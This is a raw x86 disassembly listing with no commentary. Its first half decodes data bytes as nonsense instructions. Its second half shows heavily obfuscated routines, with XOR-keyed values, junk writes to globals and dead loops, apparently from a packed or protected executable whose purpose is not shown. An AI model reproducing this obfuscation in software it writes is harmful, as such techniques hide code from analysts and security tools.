  407f51:	jne    0x407fc9
  407f53:	mov    eax,0xa26eae32
  407f58:	call   0x6ca916f
  407f5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f5e:	fsubr  QWORD PTR [ebx]
  407f60:	xcrypt-ofb (bad)
  407f61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f62:	in     eax,dx
  407f63:	mov    esi,DWORD PTR [edx]
  407f65:	mov    WORD PTR ds:[edx],?
  407f68:	pop    edx
  407f69:	push   0x7b
  407f6b:	sbb    DWORD PTR [ecx-0x1da7adbe],0x71
  407f72:	mov    esp,ss
  407f74:	dec    edx
  407f75:	pop    eax
  407f76:	lock push ebx
  407f78:	test   BYTE PTR [edi],cl
  407f7a:	add    eax,ecx
  407f7c:	mov    bl,0x41
  407f7e:	add    cl,BYTE PTR [edx+0x623f57]
  407f84:	dec    ebp
  407f85:	mov    esp,0x2b7ce99c
  407f8a:	test   BYTE PTR [ebx],al
  407f8c:	pop    es
  407f8d:	push   ss
  407f8e:	ds dec eax
  407f90:	sahf   
  407f91:	add    edi,DWORD PTR [eax+0x6bd559a8]
  407f97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f98:	in     al,dx
  407f99:	(bad)  
  407f9a:	icebp  
  407f9b:	mov    ds:0x1401a4ad,eax
  407fa0:	jl     0x407fbd
  407fa2:	shr    BYTE PTR [ecx],0xc3
  407fa5:	adc    DWORD PTR [ecx-0x78f5a156],ebx
  407fab:	dec    ecx
  407fac:	loope  0x407ff4
  407fae:	xchg   ecx,eax
  407faf:	or     bh,BYTE PTR ds:0x192357b4
  407fb5:	call   0x51795525
  407fba:	(bad)  
  407fbb:	ds xchg esi,eax
  407fbd:	test   DWORD PTR [esi-0xeaafefc],0xc02bc155
  407fc7:	adc    BYTE PTR [ebx+0x10],ah
  407fca:	jle    0x408021
  407fcc:	repnz stc 
  407fce:	dec    ebx
  407fcf:	nop
  407fd0:	dec    ecx
  407fd1:	mov    esp,0x9d358474
  407fd6:	and    al,0x12
  407fd8:	add    al,0x74
  407fda:	xor    edi,ecx
  407fdc:	add    DWORD PTR [esi+0x19],edi
  407fdf:	mov    eax,ds:0x3445034a
  407fe4:	push   eax
  407fe5:	cmp    DWORD PTR [ebx+0x1477ceb],0x2b
  407fec:	stos   BYTE PTR es:[edi],al
  407fed:	cmp    ecx,DWORD PTR [eax]
  407fef:	push   edi
  407ff0:	cmp    ah,BYTE PTR [edx-0x64]
  407ff3:	pop    ss
  407ff4:	adc    al,0x2d
  407ff6:	jmp    FWORD PTR [edx+0x1d009092]
  407ffc:	or     al,0x76
  407ffe:	ins    DWORD PTR es:[edi],dx
  407fff:	dec    edi
  408000:	sbb    DWORD PTR [ebx-0x15],ebx
  408003:	icebp  
  408004:	sahf   
  408005:	and    DWORD PTR [esi],ecx
  408007:	mov    bl,0xaa
  408009:	adc    eax,0xd550904e
  40800e:	lods   eax,DWORD PTR ds:[esi]
  40800f:	je     0x407f97
  408011:	retf   
  408012:	(bad)  
  408013:	mov    cl,0xae
  408015:	stc    
  408016:	dec    edi
  408017:	rol    BYTE PTR [edi+0x634dc6a2],cl
  40801d:	fwait
  40801e:	inc    eax
  40801f:	shr    esi,0x9c
  408022:	inc    ebp
  408023:	neg    BYTE PTR [esi]
  408025:	mov    ah,0x22
  408027:	(bad)  
  408028:	outs   dx,BYTE PTR ds:[esi]
  408029:	add    al,0x8a
  40802b:	jp     0x40806f
  40802d:	mov    eax,ds:0xce028fda
  408032:	mov    WORD PTR [edx+0x45],?
  408035:	or     dl,BYTE PTR [esi]
  408037:	mov    eax,0xc5a6577
  40803d:	sbb    bh,BYTE PTR [ebx]
  40803f:	mov    es,ebp
  408041:	inc    esp
  408042:	retf   
  408043:	fnstenv [ecx+0x570cbc6e]
  408049:	mov    esi,0x3f249d35
  40804e:	cli    
  40804f:	push   0xb1edd346
  408054:	xchg   edi,eax
  408055:	xchg   ecx,eax
  408056:	add    BYTE PTR [ebx-0x67dd9a73],0x6a
  40805d:	ds dec BYTE PTR gs:[edi-0x30]
  408062:	xor    al,0x63
  408064:	xchg   ecx,eax
  408065:	jmp    0x4080d4
  408067:	shr    ah,0xd5
  40806a:	cs (bad) 
  40806c:	xor    al,0xd9
  40806e:	fnstenv [edi]
  408070:	xchg   esp,eax
  408071:	push   ebp
  408072:	or     eax,0x2045b9c8
  408077:	or     al,0x5c
  408079:	loope  0x40809d
  40807b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40807c:	pop    ebx
  40807d:	pop    ds
  40807e:	out    dx,al
  40807f:	fidiv  DWORD PTR [ecx-0x636599e6]
  408085:	and    dl,BYTE PTR [ecx-0x264bbd27]
  40808b:	sub    dl,al
  40808d:	cwde   
  40808e:	out    dx,eax
  40808f:	das    
  408090:	mov    esi,0x1969cd6b
  408095:	bound  ecx,QWORD PTR [eax-0x77896517]
  40809b:	shr    DWORD PTR [esp+ebx*2],0x3e
  40809f:	pop    ebx
  4080a0:	jae    0x40806d
  4080a2:	fsubr  QWORD PTR [edi+0x3d]
  4080a5:	mov    edx,0x83168b79
  4080aa:	xchg   edx,eax
  4080ab:	push   cs
  4080ac:	pop    edi
  4080ad:	(bad)  
  4080ae:	jmp    0x3727:0xb089b546
  4080b5:	mov    BYTE PTR [edx+edi*1-0x3f],0x45
  4080ba:	mov    cl,0x4e
  4080bc:	imul   ebp,DWORD PTR [ecx-0x70],0xffffffa5
  4080c0:	das    
  4080c1:	test   DWORD PTR [ebx],eax
  4080c3:	(bad)  
  4080c4:	jae    0x40811e
  4080c6:	pushw  ss
  4080c8:	in     eax,0xbe
  4080ca:	je     0x408056
  4080cc:	dec    ebp
  4080cd:	adc    BYTE PTR [edx],ch
  4080cf:	inc    ebx
  4080d0:	inc    esi
  4080d1:	fldcw  WORD PTR [esi+0x44a1bce1]
  4080d7:	out    dx,al
  4080d8:	in     al,0xc7
  4080da:	pop    es
  4080db:	mov    ch,0x59
  4080dd:	outs   dx,BYTE PTR ds:[esi]
  4080de:	push   esi
  4080df:	scas   al,BYTE PTR es:[di]
  4080e1:	popf   
  4080e2:	ret    0xec56
  4080e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080e6:	cmp    ecx,edx
  4080e8:	adc    bl,BYTE PTR [ebp-0x7c]
  4080eb:	and    BYTE PTR [edx-0x46848bf4],dl
  4080f1:	and    eax,0x3d6f2388
  4080f6:	mov    eax,0xf7f014b6
  4080fb:	rcl    BYTE PTR [ebp+0x26],0x10
  4080ff:	shl    BYTE PTR [ebx+0x2cfa3974],cl
  408105:	imul   ebx,DWORD PTR [ebp-0x24db1d8d],0x0
  40810c:	adc    DWORD PTR [edi],edi
  40810e:	stc    
  40810f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408110:	mov    ds:0xec986341,eax
  408115:	retf   0xfb6a
  408118:	jb     0x4080b9
  40811a:	iret   
  40811b:	cmp    al,0x0
  40811d:	repnz mov ebp,0xf66ac220
  408123:	dec    ebx
  408124:	jecxz  0x40819a
  408126:	pop    edi
  408127:	mov    ds:0xfbbee025,eax
  40812c:	and    esi,DWORD PTR [eax+0x43d48aec]
  408132:	pop    ss
  408133:	sbb    al,0xdf
  408135:	mov    ecx,0xbcc40892
  40813a:	push   es
  40813b:	xor    DWORD PTR [ecx+ebp*8-0xe],edi
  40813f:	push   0x27e5f86a
  408144:	cmp    dl,BYTE PTR [eax]
  408146:	fisub  WORD PTR [edi+edi*8+0x28]
  40814a:	jne    0x408190
  40814c:	and    ecx,DWORD PTR [edi-0x1c72dccb]
  408152:	sti    
  408153:	loopne 0x408143
  408155:	movaps XMMWORD PTR [si+0x1400],xmm2
  40815b:	stos   BYTE PTR es:[edi],al
  40815c:	jmp    0xcb7e:0xda197db4
  408163:	push   ss
  408164:	mov    esi,0xda6a2728
  408169:	clc    
  40816a:	push   0xfffffff0
  40816c:	mov    ds:0xd5d43628,al
  408171:	sub    al,BYTE PTR [eax+0x2b141e03]
  408177:	xchg   edx,eax
  408178:	addr16 push cs
  40817a:	adc    BYTE PTR ds:0x9abd1808,dl
  408180:	out    dx,al
  408181:	lods   eax,DWORD PTR ds:[esi]
  408182:	mov    BYTE PTR [edi-0x23],cl
  408185:	mov    al,0xf4
  408187:	jne    0x4081a3
  408189:	jecxz  0x408202
  40818b:	jo     0x408120
  40818d:	inc    ecx
  40818e:	(bad)  
  40818f:	fiadd  WORD PTR [edx-0x22439346]
  408195:	mov    ah,0x1e
  408197:	adc    eax,0x688e63c8
  40819c:	xor    ebp,DWORD PTR [edx+0x51b8a31a]
  4081a2:	xor    BYTE PTR [edi-0x583c59fd],bh
  4081a8:	stc    
  4081a9:	dec    edi
  4081aa:	mov    bh,0x26
  4081ac:	sub    eax,0xaa729961
  4081b1:	enter  0xca20,0xb1
  4081b5:	dec    edi
  4081b6:	div    DWORD PTR [esp+edx*2-0x6b]
  4081ba:	or     eax,0x4e6d8097
  4081bf:	shl    BYTE PTR [eax+0x47c7318b],0x48
  4081c6:	dec    esp
  4081c7:	inc    ebx
  4081c8:	inc    edx
  4081c9:	test   BYTE PTR [edx+0x55],0x62
  4081cd:	mov    dh,0xe
  4081cf:	pop    ss
  4081d0:	push   eax
  4081d1:	or     eax,0x70270755
  4081d6:	jns    0x40821d
  4081d8:	push   ss
  4081d9:	mov    ch,dh
  4081db:	jne    0x408239
  4081dd:	cmp    BYTE PTR [edx],al
  4081df:	repz (bad) 
  4081e1:	jge    0x40821a
  4081e3:	lahf   
  4081e4:	xchg   edi,eax
  4081e5:	and    bl,cl
  4081e7:	cmp    BYTE PTR [ebx-0x2cbe81c4],bh
  4081ed:	jmp    0xa572f721
  4081f2:	dec    edi
  4081f3:	xor    dh,bl
  4081f5:	and    bh,BYTE PTR [ecx]
  4081f7:	(bad)  
  4081f8:	nop
  4081f9:	mov    dl,0x91
  4081fb:	inc    edx
  4081fc:	out    dx,eax
  4081fd:	bound  edi,QWORD PTR [ebx-0x5d]
  408200:	outs   dx,DWORD PTR ds:[esi]
  408201:	xchg   edi,eax
  408202:	dec    ebp
  408203:	imul   edx,DWORD PTR [eax],0xcefb3db8
  408209:	pop    esi
  40820a:	bound  ebx,QWORD PTR [esi-0x288ad533]
  408210:	inc    esp
  408211:	clc    
  408212:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  408214:	cmp    al,0x7d
  408216:	test   BYTE PTR [di],dh
  408219:	push   ecx
  40821a:	daa    
  40821b:	leave  
  40821c:	rcr    DWORD PTR [edx+0x32],0xe0
  408220:	sbb    al,0xda
  408222:	clc    
  408223:	pop    edi
  408224:	pop    ecx
  408225:	push   cs
  408226:	or     ebp,DWORD PTR [eax]
  408228:	mov    ebp,0x20615f8b
  40822d:	call   0xcc96:0xbbab01ca
  408234:	stos   BYTE PTR es:[edi],al
  408235:	jno    0x408268
  408237:	aas    
  408238:	aas    
  408239:	mov    al,0x3d
  40823b:	jo     0x408282
  40823d:	fst    QWORD PTR [edx]
  40823f:	push   esp
  408240:	adc    eax,0xbcdcf00f
  408245:	aas    
  408246:	push   0x1fee71c1
  40824b:	jns    0x40820c
  40824d:	push   ss
  40824e:	mov    eax,ds:0xd32c2d86
  408253:	out    dx,eax
  408254:	xchg   ebp,eax
  408255:	xchg   ebp,eax
  408256:	out    dx,al
  408257:	dec    ebp
  408258:	mov    ds:0xa1f0d0f4,eax
  40825d:	mov    bl,0x92
  40825f:	mov    ch,0xb1
  408261:	lahf   
  408262:	jmp    0x5f50:0xdbe844d6
  408269:	xor    bl,BYTE PTR [ebp+0x14]
  40826c:	inc    eax
  40826d:	xchg   ecx,eax
  40826e:	sbb    BYTE PTR [ebx+edi*1-0x5bd6b841],bl
  408275:	sub    eax,0xeb19ae11
  40827a:	dec    eax
  40827b:	jne    0x40826a
  40827d:	xor    BYTE PTR [ebx+0x470547e4],bl
  408283:	popa   
  408284:	cmp    al,0xb1
  408286:	mov    al,ds:0x933920fe
  40828b:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  40828d:	add    DWORD PTR [eax+eiz*8-0x10aff3e],eax
  408294:	add    eax,0x9797666f
  408299:	mov    dl,0x13
  40829b:	sbb    esi,esp
  40829d:	bound  ebx,QWORD PTR [ebp+0x7b1fa3e6]
  4082a3:	sub    ebp,edi
  4082a5:	je     0x40825e
  4082a7:	cmp    eax,0x3d937201
  4082ac:	or     bl,bh
  4082ae:	xor    eax,0x515e4f68
  4082b3:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  4082b5:	pop    ss
  4082b6:	jne    0x40824c
  4082b8:	fsubp  st(6),st
  4082ba:	xor    ah,BYTE PTR [eax-0x7f]
  4082bd:	sbb    al,0xec
  4082bf:	out    0x3b,eax
  4082c1:	popf   
  4082c2:	sbb    al,0x24
  4082c4:	cdq    
  4082c5:	loopne 0x4082ae
  4082c7:	sub    eax,0xb9cd2059
  4082cc:	sbb    al,0x8a
  4082ce:	inc    edx
  4082cf:	mov    DWORD PTR ds:0x37aedd06,esp
  4082d5:	xchg   edi,eax
  4082d6:	sub    DWORD PTR [ebx-0x70112cd4],edx
  4082dc:	and    esi,ebp
  4082de:	fst    QWORD PTR [ebx+ebx*2-0x24257625]
  4082e5:	ret    
  4082e6:	pop    esp
  4082e7:	lods   eax,DWORD PTR ds:[esi]
  4082e8:	jo     0x40831a
  4082ea:	fcom   QWORD PTR [ebp+0x70]
  4082ed:	out    0x14,eax
  4082ef:	jecxz  0x4082e8
  4082f1:	xlat   BYTE PTR ds:[ebx]
  4082f2:	cmp    ebp,ebx
  4082f4:	xchg   esp,eax
  4082f5:	push   edi
  4082f6:	outs   dx,DWORD PTR ds:[esi]
  4082f7:	mov    eax,0x9ac78651
  4082fc:	xchg   DWORD PTR [edi+0x7a332e78],ebx
  408302:	jo     0x408368
  408304:	imul   edi,DWORD PTR [ecx],0xffffffa5
  408307:	test   eax,0xa6052a4b
  40830c:	les    ebp,FWORD PTR [edx]
  40830e:	adc    cl,bl
  408310:	leave  
  408311:	adc    DWORD PTR [edi+0x4],eax
  408314:	mov    bh,0x49
  408316:	cdq    
  408317:	xchg   edi,eax
  408318:	adc    BYTE PTR [ecx-0x51],dl
  40831b:	icebp  
  40831c:	aas    
  40831d:	dec    ebp
  40831e:	call   DWORD PTR [edx-0x36]
  408321:	imul   esp,DWORD PTR [ebp-0x6b],0x2
  408325:	jl     0x4082ae
  408327:	mov    edi,0x8cd514a7
  40832c:	test   eax,0x71889ecd
  408331:	shl    BYTE PTR [edi+eiz*2-0x7a],1
  408335:	adc    DWORD PTR [ecx+ebp*4+0x33],edx
  408339:	icebp  
  40833a:	(bad)  
  40833b:	test   eax,0x45e90f0
  408340:	clc    
  408341:	icebp  
  408342:	stos   BYTE PTR es:[edi],al
  408343:	inc    esp
  408344:	mov    ?,WORD PTR [ebx-0x3b]
  408347:	jmp    0x13ea:0xb4461810
  40834e:	mov    edx,0x5194b57f
  408353:	gs int3 
  408355:	movnti DWORD PTR [eax+0x16d360d5],edx
  40835c:	xchg   BYTE PTR [esi],ah
  40835e:	push   esi
  40835f:	and    BYTE PTR ds:0x41bb8d11,cl
  408365:	outs   dx,DWORD PTR ds:[esi]
  408366:	call   0xad81:0xaef0e1f0
  40836d:	xchg   esp,eax
  40836e:	sub    ebx,DWORD PTR [ecx+0x451b1d2d]
  408374:	push   ebx
  408375:	jg     0x408323
  408377:	jp     0x408332
  408379:	ror    edx,0x4f
  40837c:	sbb    BYTE PTR [edi+0x31cdf86],al
  408382:	jp     0x40831e
  408384:	jnp    0x40834f
  408386:	pop    es
  408387:	sub    di,WORD PTR [ebp-0x770bfa35]
  40838e:	jns    0x4083b8
  408390:	aas    
  408391:	push   0xaf98a103
  408396:	ret    0x7bbb
  408399:	adc    DWORD PTR [ebx],edx
  40839b:	bound  edi,QWORD PTR [esi]
  40839d:	fstp   QWORD PTR ds:0xc54cdeb2
  4083a3:	iret   
  4083a4:	neg    DWORD PTR [eax-0x51]
  4083a7:	jno    0x408343
  4083a9:	pop    edi
  4083aa:	push   0x1e0898ce
  4083af:	ror    DWORD PTR [esi+0xee0812d],1
  4083b5:	push   edi
  4083b6:	dec    edx
  4083b7:	imul   ebp,DWORD PTR [eax+0x339150e2],0xffffffea
  4083be:	xchg   esp,eax
  4083bf:	test   eax,0x3287d761
  4083c4:	lahf   
  4083c5:	inc    ebx
  4083c6:	dec    esi
  4083c7:	add    BYTE PTR [eax+0x7501b5b0],dl
  4083cd:	mov    dh,0x7b
  4083cf:	cmp    cl,BYTE PTR [eax+ecx*2-0x1c]
  4083d3:	(bad)  
  4083d4:	xor    DWORD PTR [eax+0x6c7929e9],eax
  4083da:	nop
  4083db:	push   ss
  4083dc:	(bad)  
  4083dd:	nop
  4083de:	pop    ss
  4083df:	and    bh,bh
  4083e1:	inc    edi
  4083e2:	xchg   edi,eax
  4083e3:	loopne 0x408374
  4083e5:	mov    edi,0x48ed925a
  4083ea:	or     BYTE PTR [eax],ch
  4083ec:	jmp    0x9b25:0x1fbd5923
  4083f3:	(bad)  
  4083f4:	cli    
  4083f5:	mov    BYTE PTR [eax+0x72],cl
  4083f8:	addr16 push esp
  4083fa:	sub    ebx,0xac3fe11
  408400:	daa    
  408401:	das    
  408402:	inc    esp
  408403:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408404:	ins    DWORD PTR es:[edi],dx
  408405:	mov    bl,0x1f
  408407:	and    edi,DWORD PTR [edx-0x3c]
  40840a:	in     al,dx
  40840b:	push   es
  40840c:	sahf   
  40840d:	test   DWORD PTR [esi+0x614cd90],ecx
  408413:	pop    esi
  408414:	js     0x408425
  408416:	ins    DWORD PTR es:[edi],dx
  408417:	inc    esp
  408418:	xchg   DWORD PTR [esi-0x6ed1f39f],ebp
  40841e:	cs pushf 
  408420:	push   ebx
  408421:	push   ss
  408422:	pop    ds
  408423:	adc    al,0x13
  408425:	shl    BYTE PTR [ecx],1
  408427:	or     ah,BYTE PTR [edi+edx*8-0x43f593f8]
  40842e:	and    edx,DWORD PTR [edi+eax*4+0x531530a6]
  408435:	jge    0x408413
  408437:	sahf   
  408438:	xor    ch,dh
  40843a:	jecxz  0x4083ee
  40843c:	add    dh,dh
  40843e:	lds    ebx,FWORD PTR [edx+0x48]
  408441:	mov    ah,BYTE PTR [esi]
  408443:	inc    esi
  408444:	pop    eax
  408446:	ret    
  408447:	int    0xcf
  408449:	aas    
  40844a:	mov    ebp,ebx
  40844c:	sbb    DWORD PTR [ecx+0x38ee9732],0xffffffc2
  408453:	stos   BYTE PTR es:[edi],al
  408454:	(bad)  
  408455:	test   BYTE PTR [edi+0x35],0xe4
  408459:	jmp    0x6fec6cb1
  40845e:	fs jne 0x408482
  408461:	pop    DWORD PTR ds:0xfa596c2b
  408467:	jno    0x40843e
  408469:	mov    al,BYTE PTR [eax+edx*1]
  40846c:	mov    BYTE PTR [ebp-0x1],al
  40846f:	mov    eax,DWORD PTR [ebp-0x30]
  408472:	mov    edx,DWORD PTR [ebp-0xc]
  408475:	xor    eax,esi
  408477:	add    eax,edi
  408479:	imul   eax,edx
  40847c:	mov    edx,DWORD PTR [ebp-0x28]
  40847f:	xor    edx,esi
  408481:	add    eax,edx
  408483:	mov    edx,DWORD PTR [ebp-0x8]
  408486:	movzx  eax,BYTE PTR [eax+edx*1+0x3272fa]
  40848e:	mov    edx,DWORD PTR [ebp-0x50]
  408491:	xor    edx,esi
  408493:	lea    eax,[edx+eax*1+0x3272fa]
  40849a:	movzx  edx,BYTE PTR [ebp-0x1]
  40849e:	xor    edx,eax
  4084a0:	mov    BYTE PTR [ebp-0x1],dl
  4084a3:	mov    al,BYTE PTR [ebp-0x1]
  4084a6:	mov    edx,DWORD PTR [ebp-0x30]
  4084a9:	mov    ebx,DWORD PTR [ebp-0xc]
  4084ac:	xor    edx,esi
  4084ae:	add    edx,edi
  4084b0:	imul   edx,ebx
  4084b3:	mov    ebx,DWORD PTR [ebp-0x8]
  4084b6:	mov    BYTE PTR [edx+ebx*1],al
  4084b9:	mov    eax,DWORD PTR [ebp-0x40]
  4084bc:	mov    edx,DWORD PTR [ebp-0x28]
  4084bf:	xor    eax,esi
  4084c1:	xor    edx,esi
  4084c3:	add    eax,edi
  4084c5:	add    edx,edi
  4084c7:	imul   eax,edx
  4084ca:	add    eax,DWORD PTR [ebp-0xc]
  4084cd:	mov    DWORD PTR [ebp-0xc],eax
  4084d0:	mov    eax,DWORD PTR [ebp-0xc]
  4084d3:	mov    edx,DWORD PTR [ebp-0x18]
  4084d6:	cmp    edx,eax
  4084d8:	jb     0x406053
  4084de:	mov    eax,DWORD PTR [ebp-0x28]
  4084e1:	mov    edx,DWORD PTR [ebp-0x18]
  4084e4:	xor    eax,esi
  4084e6:	add    eax,edi
  4084e8:	imul   eax,edx
  4084eb:	mov    edx,DWORD PTR [ebp-0x1c]
  4084ee:	xor    edx,esi
  4084f0:	add    edx,edi
  4084f2:	or     eax,edx
  4084f4:	mov    edx,DWORD PTR [ebp-0x20]
  4084f7:	xor    edx,esi
  4084f9:	add    eax,edx
  4084fb:	mov    edx,DWORD PTR [ebp-0x20]
  4084fe:	xor    edx,esi
  408500:	add    eax,edx
  408502:	mov    edx,DWORD PTR [ebp-0x10]
  408505:	lea    eax,[eax+edx*1+0x64e5f4]
  40850c:	jmp    0x408520
  408511:	mov    eax,DWORD PTR [ebp-0x20]
  408514:	mov    edx,DWORD PTR [ebp-0x10]
  408517:	xor    eax,esi
  408519:	lea    eax,[eax+edx*1+0x3272fa]
  408520:	mov    DWORD PTR [ebp-0x10],eax
  408523:	jmp    0x405fa0
  408528:	mov    ebx,DWORD PTR [ebp-0x3c]
  40852b:	mov    eax,DWORD PTR [ebp+0xc]
  40852e:	xor    eax,esi
  408530:	lea    ecx,[ecx+eax*1+0x3272fa]
  408537:	lea    eax,[ecx-0x3272fa]
  40853d:	xor    eax,esi
  40853f:	cmp    eax,0xf89c95b5
  408544:	jne    0x403bac
  40854a:	dec    DWORD PTR [ebp-0x34]
  40854d:	jne    0x403ba0
  408553:	mov    eax,DWORD PTR [ebp+0x8]
  408556:	mov    ecx,DWORD PTR [ebp+0xc]
  408559:	mov    edx,DWORD PTR [ebp+0x8]
  40855c:	xor    ecx,esi
  40855e:	mov    cl,BYTE PTR [ecx+ebx*1+0x3272fa]
  408565:	xor    eax,esi
  408567:	mov    al,BYTE PTR [eax+ebx*1+0x3272fa]
  40856e:	xor    edx,esi
  408570:	mov    BYTE PTR [edx+ebx*1+0x3272fa],cl
  408577:	mov    ecx,DWORD PTR [ebp+0xc]
  40857a:	xor    ecx,esi
  40857c:	mov    BYTE PTR [ecx+ebx*1+0x3272fa],al
  408583:	mov    eax,DWORD PTR [ebp+0xc]
  408586:	xor    eax,esi
  408588:	add    eax,edi
  40858a:	pop    edi
  40858b:	pop    esi
  40858c:	pop    ebx
  40858d:	leave  
  40858e:	ret    0x8
  408591:	xor    eax,eax
  408593:	ret    
  408594:	push   ebp
  408595:	mov    ebp,esp
  408597:	sub    esp,0x38
  40859a:	and    DWORD PTR ds:0x426ebd,0x0
  4085a4:	mov    eax,ds:0x426ebd
  4085a9:	inc    eax
  4085aa:	mov    ds:0x426ebd,eax
  4085af:	cmp    DWORD PTR ds:0x426ebd,0x1d
  4085b6:	jg     0x4085e2
  4085bc:	jmp    0x4085d5
  4085c1:	push   DWORD PTR [ebp-0x10]
  4085c4:	push   0x2f91
  4085c9:	push   DWORD PTR [ebp-0x20]
  4085cc:	push   DWORD PTR [ebp-0x1c]
  4085cf:	call   DWORD PTR ds:0x430a1c
  4085d5:	cmp    DWORD PTR ds:0x426ebd,0x1c
  4085dc:	jb     0x4085a4
  4085e2:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  4085e9:	sbb    DWORD PTR ds:0x426f19,ecx
  4085ef:	push   ebx
  4085f0:	add    DWORD PTR ds:0x426f15,edx
  4085f6:	mov    DWORD PTR [ebp-0xc],0xf89c85b4
  4085fd:	xor    DWORD PTR ds:0x426e91,0x301b
  408607:	mov    eax,DWORD PTR [ebp-0x4]
  40860a:	xor    DWORD PTR ds:0x426f2d,0x2f12
  408614:	push   esi
  408615:	sbb    DWORD PTR ds:0x426ed9,edi
  40861b:	mov    esi,0x75108b3
  408620:	or     DWORD PTR ds:0x426eb9,0x50e3
  40862a:	xor    eax,esi
  40862c:	adc    DWORD PTR ds:0x426ecd,0x426e99
  408636:	push   edi
  408637:	mov    edi,0x3272fa
  40863c:	or     DWORD PTR ds:0x426ea1,0x426e81
  408646:	add    eax,edi
  408648:	and    DWORD PTR ds:0x426f29,0x7053
  408652:	mov    DWORD PTR [ebp-0x1c],eax
  408655:	mov    eax,DWORD PTR [ebp+0x14]
  408658:	test   eax,eax
  40865a:	mov    DWORD PTR ds:0x426f09,0x1147
  408664:	je     0x408688
  40866a:	mov    eax,ds:0x426ec5
  40866f:	and    eax,DWORD PTR ds:0x426e89
  408675:	mov    ds:0x426ec5,eax
  40867a:	mov    eax,DWORD PTR [ebp+0x14]
  40867d:	adc    ebx,0x54d7
  408683:	mov    eax,DWORD PTR [eax]
  408685:	mov    DWORD PTR [ebp-0x1c],eax
  408688:	mov    eax,DWORD PTR [ebp-0x4]
  40868b:	and    DWORD PTR ds:0x426ea1,0x0
  408695:	mov    ebx,DWORD PTR ds:0x426ea1
  40869b:	inc    ebx
  40869c:	mov    DWORD PTR ds:0x426ea1,ebx
  4086a2:	cmp    DWORD PTR ds:0x426ea1,0x9
  4086a9:	ja     0x4086e9
  4086af:	jmp    0x4086c2
  4086b4:	push   0x426e8d
  4086b9:	push   DWORD PTR [ebp-0x14]
  4086bc:	call   DWORD PTR ds:0x430a48
  4086c2:	cmp    DWORD PTR ds:0x426ea1,0x8
  4086c9:	jne    0x4086dc
  4086cf:	mov    ebx,DWORD PTR ds:0x426ea1
  4086d5:	inc    ebx
  4086d6:	mov    DWORD PTR ds:0x426ea1,ebx
  4086dc:	cmp    DWORD PTR ds:0x426ea1,0x1e
  4086e3:	jb     0x408695
  4086e9:	xor    eax,esi
  4086eb:	sbb    ebx,DWORD PTR ds:0x426e85
  4086f1:	add    eax,edi
  4086f3:	mov    DWORD PTR [ebp-0x8],eax
  4086f6:	mov    eax,ds:0x426e85
  4086fb:	sub    DWORD PTR ds:0x426ed9,eax
  408701:	mov    eax,DWORD PTR [ebp-0xc]
  408704:	xor    eax,esi
  408706:	and    DWORD PTR ds:0x426edd,ecx
  40870c:	add    eax,edi
  40870e:	mov    DWORD PTR [ebp-0x24],eax
  408711:	mov    eax,DWORD PTR [ebp-0x4]
  408714:	xor    eax,esi
  408716:	and    DWORD PTR ds:0x426eb1,0x0
  408720:	jmp    0x408734
  408725:	xor    ebx,ebx
  408727:	or     ebx,DWORD PTR ds:0x426eb1
  40872d:	inc    ebx
  40872e:	mov    DWORD PTR ds:0x426eb1,ebx
  408734:	cmp    DWORD PTR ds:0x426eb1,0x15
  40873b:	jae    0x40878a
  408741:	cmp    DWORD PTR ds:0x426eb1,0x4
  408748:	ja     0x40878a
  40874e:	jmp    0x40876b
  408753:	push   0x3639
  408758:	push   0x1bb0
  40875d:	push   DWORD PTR [ebp-0x10]
  408760:	push   0x5fa6
  408765:	call   DWORD PTR ds:0x430a4c
  40876b:	cmp    DWORD PTR ds:0x426eb1,0x3
  408772:	jne    0x408785
  408778:	mov    ebx,DWORD PTR ds:0x426eb1
  40877e:	inc    ebx
  40877f:	mov    DWORD PTR ds:0x426eb1,ebx
  408785:	jmp    0x408725
  40878a:	add    eax,edi
  40878c:	movzx  ebx,BYTE PTR ds:0x426f15
  408793:	sub    DWORD PTR ds:0x426ea1,ebx
  408799:	mov    DWORD PTR [ebp-0x30],eax
  40879c:	sub    eax,eax
  40879e:	mov    ebx,DWORD PTR [ebp-0x4]
  4087a1:	not    eax
  4087a3:	xor    ebx,esi
  4087a5:	add    ebx,edi
  4087a7:	sbb    eax,0xd90
  4087ac:	mov    eax,DWORD PTR [ebp-0x24]
  4087af:	dec    DWORD PTR ds:0x426ea9
  4087b5:	sub    eax,edi
  4087b7:	lea    ecx,[ebx-0x3272fa]
  4087bd:	sbb    DWORD PTR ds:0x426f29,0x78a2
  4087c7:	xor    eax,esi
  4087c9:	add    DWORD PTR ds:0x426ec9,0x4dad
  4087d3:	xor    ecx,esi
  4087d5:	cmp    ecx,eax
  4087d7:	mov    DWORD PTR ds:0x426ef5,0x6961
  4087e1:	je     0x408aae
  4087e7:	add    DWORD PTR ds:0x426f01,0x426f15
  4087f1:	mov    eax,DWORD PTR [ebp-0x4]
  4087f4:	sub    DWORD PTR ds:0x426e81,0x820
  4087fe:	xor    eax,esi
  408800:	add    eax,edi
  408802:	mov    DWORD PTR ds:0x426eb1,0x301a
  40880c:	cmp    ebx,eax
  40880e:	mov    DWORD PTR ds:0x426ee5,0x6594
  408818:	jne    0x408a65
  40881e:	push   DWORD PTR [ebp+0x8]
  408821:	sub    DWORD PTR ds:0x426ee9,0x426f19
  40882b:	call   0x41d4a8
  408830:	mov    DWORD PTR [ebp-0x14],eax
  408833:	sub    DWORD PTR ds:0x426f15,edx
  408839:	mov    eax,DWORD PTR [ebp-0x4]
  40883c:	and    ecx,0x4a39
  408842:	mov    ecx,DWORD PTR [ebp-0x14]
  408845:	xor    eax,esi
  408847:	sub    DWORD PTR ds:0x426eb5,0x426f0d
  408851:	add    eax,edi
  408853:	cmp    ecx,eax
  408855:	je     0x40aece
  40885b:	adc    DWORD PTR ds:0x426f25,0x56c1
  408865:	push   DWORD PTR [ebp-0x14]
  408868:	and    DWORD PTR ds:0x426f29,0x426f11
  408872:	push   DWORD PTR [ebp+0x8]
